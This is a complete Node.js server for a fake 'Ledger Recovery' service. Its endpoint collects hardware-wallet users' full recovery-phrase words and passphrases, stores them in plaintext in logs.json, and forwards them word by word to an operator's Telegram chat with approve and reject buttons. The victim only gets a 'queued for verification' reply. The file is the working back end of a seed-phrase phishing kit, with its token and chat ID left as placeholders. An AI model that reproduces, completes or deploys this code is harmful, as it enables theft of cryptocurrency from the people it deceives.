const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');
const fs = require('fs').promises;
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 1337;

app.use(cors());
app.use(express.json());

app.use(express.static(path.join(__dirname, 'public')));

const TELEGRAM_BOT_TOKEN = 'BOTTOKENHERE';
const TELEGRAM_CHAT_ID = 'LOGID';

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { 
  polling: {
    interval: 1000,
    autoStart: true,
    params: {
      timeout: 10
    }
  }
});

console.log('🤖 Telegram bot initialized and listening for updates...');

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '🤖 Ledger Recovery Bot is online and ready!\n\nThis bot will receive recovery phrase submissions for admin review.');
});

bot.onText(/\/status/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `📊 Bot Status:\n\n• Queue: ${submissionQueue.size} pending submissions\n• Server: Running on port ${PORT}\n• Time: ${new Date().toISOString()}`);
});

bot.on('callback_query', async (callbackQuery) => {
  try {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    
    console.log(`📱 Received callback query: ${data} from message ${messageId}`);
    const firstUnderscoreIndex = data.indexOf('_');
    if (firstUnderscoreIndex === -1) {
      console.log('❌ Invalid callback data format:', data);
      try {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: 'Invalid callback data format',
          show_alert: true
        });
      } catch (err) {
        console.log('Could not answer callback query (invalid format):', err.message);
      }
      return;
    }
    
    const action = data.substring(0, firstUnderscoreIndex);
    const submissionId = data.substring(firstUnderscoreIndex + 1);
    
    if (!submissionId) {
      try {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: 'Invalid submission ID',
          show_alert: true
        });
      } catch (err) {
        console.log('Could not answer callback query (invalid ID):', err.message);
      }
      return;
    }
    console.log(`🔍 Looking for submission: ${submissionId}`);
    console.log(`📋 Current queue size: ${submissionQueue.size}`);
    console.log(`🔑 Queue keys:`, Array.from(submissionQueue.keys()));
    
    let submission = submissionQueue.get(submissionId);
    if (!submission) {
      console.log(`❌ Not found in memory queue, checking logs file...`);
      const logs = await loadLogs();
      console.log(`📄 Logs file contains ${logs.length} submissions`);
      
      submission = logs.find(log => log.id === submissionId);
      if (!submission) {
        console.log(`❌ Submission ${submissionId} not found in logs either!`);
        console.log(`📝 Available submission IDs in logs:`, logs.map(log => log.id));
        
        try {
          await bot.answerCallbackQuery(callbackQuery.id, {
            text: 'Submission not found',
            show_alert: true
          });
        } catch (err) {
          console.log('Could not answer callback query (not found):', err.message);
        }
        return;
      }
      
      console.log(`✅ Found submission in logs, adding to queue: ${submissionId}`);
      submissionQueue.set(submissionId, submission);
    } else {
      console.log(`✅ Found submission in memory queue: ${submissionId}`);
    }
    if (submission.status !== STATUS.PENDING) {
      try {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: `Submission already ${submission.status}`,
          show_alert: true
        });
      } catch (err) {
        console.log('Could not answer callback query (already processed):', err.message);
      }
      return;
    }
      
      if (action === 'approve') {
        submission.status = STATUS.APPROVED;
        submission.approvedAt = new Date().toISOString();
        submissionQueue.set(submissionId, submission);
        const logs = await loadLogs();
        const logIndex = logs.findIndex(log => log.id === submissionId);
        if (logIndex !== -1) {
          logs[logIndex].status = STATUS.APPROVED;
          logs[logIndex].approvedAt = submission.approvedAt;
          await saveLogs(logs);
        }
        
        console.log(`✅ Approved submission: ${submissionId}`);
        try {
          await bot.answerCallbackQuery(callbackQuery.id, {
            text: '✅ Submission approved successfully!'
          });
        } catch (answerError) {
          if (answerError.message.includes('query is too old') || answerError.message.includes('QUERY_ID_INVALID')) {
            console.log(`⚠️  Callback query ${callbackQuery.id} was too old, but approval was processed`);
          } else {
            console.log('Could not answer callback query (approve):', answerError.message);
          }
        }
        try {
          const updatedText = callbackQuery.message.text + '\n\n✅ **APPROVED** by admin';
          await bot.editMessageText(updatedText, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
          });
        } catch (editError) {
          console.log('Could not edit message (may be too old):', editError.message);
        }
        
      } else if (action === 'reject') {
        submission.status = STATUS.REJECTED;
        submission.rejectedAt = new Date().toISOString();
        submission.rejectionReason = 'Rejected by admin via Telegram';
        submissionQueue.set(submissionId, submission);
        const logs = await loadLogs();
        const logIndex = logs.findIndex(log => log.id === submissionId);
        if (logIndex !== -1) {
          logs[logIndex].status = STATUS.REJECTED;
          logs[logIndex].rejectedAt = submission.rejectedAt;
          logs[logIndex].rejectionReason = submission.rejectionReason;
          await saveLogs(logs);
        }
        
        console.log(`❌ Rejected submission: ${submissionId}`);
        try {
          await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ Submission rejected successfully!'
          });
        } catch (answerError) {
          if (answerError.message.includes('query is too old') || answerError.message.includes('QUERY_ID_INVALID')) {
            console.log(`⚠️  Callback query ${callbackQuery.id} was too old, but rejection was processed`);
          } else {
            console.log('Could not answer callback query (reject):', answerError.message);
          }
        }
        try {
          const updatedText = callbackQuery.message.text + '\n\n❌ **REJECTED** by admin';
          await bot.editMessageText(updatedText, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
          });
        } catch (editError) {
          console.log('Could not edit message (may be too old):', editError.message);
        }
      }
    
  } catch (error) {
    console.error('Error handling callback query:', error.message);
    console.error('Full error:', error);
    try {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: 'Error processing request',
        show_alert: true
      });
    } catch (finalError) {
      if (finalError.message.includes('query is too old') || finalError.message.includes('QUERY_ID_INVALID')) {
        console.log(`⚠️  Could not answer error callback query - too old: ${finalError.message}`);
      } else {
        console.error('Failed to answer callback query:', finalError.message);
      }
    }
  }
});

bot.on('error', (error) => {
  console.error('Telegram bot error:', error.message);
});

bot.on('polling_error', (error) => {
  if (error.message.includes('query is too old') || 
      error.message.includes('QUERY_ID_INVALID') ||
      error.message.includes('terminated by other getUpdates request')) {
    console.log(`⚠️  Polling warning (ignoring): ${error.message}`);
    return;
  }
  
  console.error('Telegram polling error:', error.message);
  if (error.message.includes('ECONNRESET') || error.message.includes('ETIMEDOUT')) {
    console.log('🔄 Network error detected, polling will continue automatically...');
  }
});

const DEVICE_MODELS = {
  'nano_x': 'Ledger Nano X',
  'nano_s_plus': 'Ledger Nano S Plus',
  'ledger_blue': 'Ledger Blue',
  'ledger_stax': 'Ledger Stax',
  'ledger_flex': 'Ledger Flex',
  'ledger_nano_gen5': 'Ledger Nano (Gen 5)'
};

const receivedData = [];
const LOGS_FILE_PATH = path.join(__dirname, 'logs.json');

const submissionQueue = new Map();

const STATUS = {
  PENDING: 'pending',
  APPROVED: 'approved', 
  REJECTED: 'rejected'
};

const loadLogs = async () => {
  try {
    const data = await fs.readFile(LOGS_FILE_PATH, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    if (error.code === 'ENOENT') {
      return [];
    }
    console.error('Error loading logs:', error);
    return [];
  }
};

const saveLogs = async (logs) => {
  try {
    await fs.writeFile(LOGS_FILE_PATH, JSON.stringify(logs, null, 2));
    return true;
  } catch (error) {
    console.error('Error saving logs:', error);
    return false;
  }
};

const generateId = () => {
  return `${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
};

const iqfg = async () => {
  try {
    const logs = await loadLogs();
    console.log(`📄 Found ${logs.length} total submissions in logs`);
    
    logs.forEach(log => {
      console.log(`📝 Processing log entry: ${log.id} - status: ${log.status}`);
      if (log.status === STATUS.PENDING) {
        submissionQueue.set(log.id, log);
        console.log(`✅ Added to queue: ${log.id}`);
      }
    });
    
    console.log(`📋 Loaded ${submissionQueue.size} pending submissions from logs`);
    console.log(`🔍 Queue contents:`, Array.from(submissionQueue.keys()));
  } catch (error) {
    console.error('Error loading queue from logs:', error);
  }
};

const formatTelegramMessage = (data) => {
  const modelName = DEVICE_MODELS[data.model] || data.model;
  const timestamp = new Date().toISOString();
  
  let message = `🔔 *New Ledger Recovery Submission*\n\n`;
  message += `🆔 *Submission ID:* \`${data.id}\`\n`;
  message += `📱 *Device Model:* ${modelName}\n`;
  message += `🔢 *Seed Length:* ${data.seedLength} words\n`;
  message += `⏰ *Timestamp:* ${timestamp}\n\n`;
  
  if (data.hasPassphrase && data.passphrase) {
    message += `🔐 *Passphrase:* \`${data.passphrase}\`\n\n`;
  }
  
  message += `🔤 *Recovery Phrase Words:*\n`;
  data.words.forEach((word, index) => {
    if (word && word.trim()) {
      message += `${index + 1}. \`${word.trim()}\`\n`;
    }
  });
  
  message += `\n---\n`;
  message += `💡 *Review this submission and choose an action below.*`;
  
  return message;
};

const sendToTelegram = async (message, submissionId = null) => {
  try {
    const options = {
      parse_mode: 'Markdown'
    };
    if (submissionId) {
      options.reply_markup = {
        inline_keyboard: [[
          {
            text: '✅ Approve',
            callback_data: `approve_${submissionId}`
          },
          {
            text: '❌ Reject',
            callback_data: `reject_${submissionId}`
          }
        ]]
      };
    }
    
    const result = await bot.sendMessage(TELEGRAM_CHAT_ID, message, options);
    
    console.log('Message sent to Telegram successfully');
    return { success: true, data: result };
  } catch (error) {
    console.error('Error sending to Telegram:', error.message);
    return { success: false, error: error.message };
  }
};

const validatePassphraseOrder = (passphrase, words) => {
  if (!passphrase || !words || words.length === 0) {
    return false;
  }
  
  const passphraseWords = passphrase.toLowerCase().split(/\s+/).filter(word => word.length > 0);
  const recoveryWords = words.map(word => word.toLowerCase().trim()).filter(word => word.length > 0);
  let recoveryIndex = 0;
  for (const passphraseWord of passphraseWords) {
    let found = false;
    for (let i = recoveryIndex; i < recoveryWords.length; i++) {
      if (recoveryWords[i] === passphraseWord) {
        recoveryIndex = i + 1;
        found = true;
        break;
      }
    }
    if (!found) {
      return false;
    }
  }
  
  return true;
};

app.post('/api/submit-recovery', async (req, res) => {
  try {
    const { model, seedLength, hasPassphrase, passphrase, words } = req.body;
    if (!model || !seedLength || !words || !Array.isArray(words)) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields: model, seedLength, and words array'
      });
    }
    const nonEmptyWords = words.filter(word => word && word.trim().length > 0);
    if (nonEmptyWords.length !== parseInt(seedLength)) {
      return res.status(400).json({
        success: false,
        error: `Word count (${nonEmptyWords.length}) does not match seed length (${seedLength})`
      });
    }
    const submissionId = generateId();
    const submissionData = {
      id: submissionId,
      model,
      seedLength: parseInt(seedLength),
      hasPassphrase: hasPassphrase || false,
      passphrase: hasPassphrase ? passphrase : null,
      words: words,
      timestamp: new Date().toISOString(),
      passphraseValid: false,
      status: STATUS.PENDING
    };
    if (hasPassphrase && passphrase) {
      submissionData.passphraseValid = validatePassphraseOrder(passphrase, words);
    }
    submissionQueue.set(submissionId, submissionData);
    receivedData.push(submissionData);
    const logs = await loadLogs();
    logs.push(submissionData);
    await saveLogs(logs);
    const telegramMessage = formatTelegramMessage(submissionData);
    const telegramResult = await sendToTelegram(telegramMessage, submissionId);
    
    if (!telegramResult.success) {
      console.error('Failed to send to Telegram:', telegramResult.error);
    }
    res.json({
      success: true,
      message: 'Recovery phrase submitted and queued for verification',
      data: {
        id: submissionId,
        status: STATUS.PENDING,
        timestamp: submissionData.timestamp,
        passphraseValid: submissionData.passphraseValid,
        telegramSent: telegramResult.success
      }
    });
    
  } catch (error) {
    console.error('Error processing recovery submission:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error'
    });
  }
});

app.get('/api/status/:id', async (req, res) => {
  try {
    const { id } = req.params;
    if (submissionQueue.has(id)) {
      const submission = submissionQueue.get(id);
      return res.json({
        success: true,
        data: {
          id: submission.id,
          status: submission.status,
          timestamp: submission.timestamp,
          model: submission.model
        }
      });
    }
    const logs = await loadLogs();
    const submission = logs.find(log => log.id === id);
    
    if (!submission) {
      return res.status(404).json({
        success: false,
        error: 'Submission not found'
      });
    }
    
    res.json({
      success: true,
      data: {
        id: submission.id,
        status: submission.status,
        timestamp: submission.timestamp,
        model: submission.model
      }
    });
    
  } catch (error) {
    console.error('Error checking status:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error'
    });
  }
});

app.get('/api/submissions', (req, res) => {
  res.json({
    success: true,
    count: receivedData.length,
    data: receivedData.map(item => ({
      id: item.id,
      model: item.model,
      seedLength: item.seedLength,
      hasPassphrase: item.hasPassphrase,
      status: item.status,
      timestamp: item.timestamp,
      passphraseValid: item.passphraseValid,
      wordsCount: item.words.filter(w => w && w.trim()).length
    }))
  });
});

app.use((error, req, res, next) => {
  console.error('Unhandled error:', error);
  res.status(500).json({
    success: false,
    error: 'Internal server error'
  });
});

app.listen(PORT, async () => {
  console.log(`${PORT}`);
  
  await iqfg();
});

process.on('SIGINT', () => {
  console.log('we going down');
  bot.stopPolling();
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('going down');
  bot.stopPolling();
  process.exit(0);
});

module.exports = app;